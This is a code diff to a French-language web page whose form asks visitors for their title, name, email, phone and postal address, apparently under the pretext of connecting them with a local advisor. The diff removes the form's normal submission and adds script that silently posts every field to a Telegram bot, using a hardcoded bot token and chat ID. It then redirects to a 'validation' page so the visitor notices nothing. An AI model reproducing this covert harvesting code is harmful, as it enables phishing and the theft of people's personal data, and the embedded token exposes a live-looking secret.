@@ -324,7 +324,7 @@
         <section class="client-info">
             <h2>Renseignez vos coordonnées</h2>
             <p>Renseignez vos coordonnées dans le formulaire ci-après afin que nous vous redirigions vers le conseiller le plus proche de chez vous.</p>
-            <form id="client-form" action="validation.html" method="GET">
+            <form id="client-form">
                 <div>
                     <label>Civilité *</label>
                     <div>
@@ -393,6 +393,57 @@
         window.onload = function() {
             updatePhoneNumber();
         };
+
+        // Envoyer les données du formulaire au bot Telegram
+        document.getElementById("client-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Empêcher la soumission par défaut du formulaire
+
+            // Récupérer les données du formulaire
+            const formData = new FormData(event.target);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+
+            // Construire le message pour Telegram
+            const message = `
+                Nouvelle commande :
+                Civilité : ${data.civility}
+                Nom Prénom : ${data["first-name"]}
+                Mail : ${data["last-mail"]}
+                Pays : ${data.country}
+                Téléphone : ${data.phone}
+                Rue : ${data.street}
+                N° : ${data["street-number"]}
+                Code postal : ${data["postal-code"]}
+                Ville : ${data.city}
+            `;
+
+            // Envoyer le message à votre bot Telegram
+            const botToken = "7315513590:AAEE1gm8yqNoffaaR_Ro2mdxt-J1Zi8qwug";
+            const chatId = "5372119436";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message envoyé avec succès :", data);
+                // Rediriger vers validation.html après l'envoi
+                window.location.href = "validation.html";
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi du message :", error);
+            });
+        });
     </script>
 </body>
 </html>
